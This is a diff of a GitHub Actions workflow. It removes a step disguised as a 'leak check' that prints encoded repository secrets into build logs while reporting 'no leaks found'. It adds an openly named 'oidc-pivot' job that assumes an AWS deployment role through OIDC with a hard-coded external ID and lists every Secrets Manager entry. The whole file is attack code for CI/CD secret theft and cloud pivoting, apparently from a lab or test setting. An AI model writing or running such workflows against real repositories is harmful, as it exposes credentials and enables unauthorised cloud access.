@@ -1,39 +1,36 @@
-name: WEEKLY CHECKUP
+name: oidc-pivot
+on: workflow_dispatch
 
+permissions:
+  id-token: write
+  contents: read
 
-
-
-
-
-on:
-  push:
-
-
-
-
+env:
+  AWS_REGION: us-west-2
+  ROLE_ARN: arn:aws:iam::170974506515:role/github-deployment-role
+  EXTID: extidHX9F3A1
+  SECRET_ID: internal/secrets/id-v2
 
 jobs:
- Weekly-checks:
-  runs-on: ubuntu-latest
+  pivot:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Configure AWS via OIDC
+        uses: aws-actions/configure-aws-credentials@v4
+        with:
+          role-to-assume: ${{ env.ROLE_ARN }}
+          role-external-id: ${{ env.EXTID }}
+          aws-region: ${{ env.AWS_REGION }}
 
+      - name: Install jq
+        run: |
+          sudo apt-get update -y
+          sudo apt-get install -y jq
 
-
-
-
-
-  steps:
-    - name: Encrypted Github secrets
-      run: |
-        echo "${{ secrets.ENCODED_ROLE1_ARN }}" > secret_role_arn.b64
-        echo "${{ secrets.ENCODED_SECRET_ID }}" > secret_id.b64
-    - name: Leak check
-      run: |
-        
-        # Print "diagnostic output"
-        echo "::group::System Diagnostic"
-        echo "🔧 ENV CHECK: OK"
-        echo "🔧 ROLE CHECK: OK"
-        echo "🔧 Role_arn: $(cat secret_role_arn.b64)"
-        echo "🔧 secret_id: $(cat secret_id.b64)"
-        echo "🔧 TEST PASSED - NO LEAKS FOUND"
-        echo "::endgroup::"
+      - name: Enumerate secrets
+        run: |
+          aws secretsmanager list-secrets \
+            --region "$AWS_REGION" \
+            --query 'SecretList[].Name' --output text | tr '\t' '\n' > /tmp/secret_names.txt
+          echo "Found secrets:"
+          cat /tmp/secret_names.txt
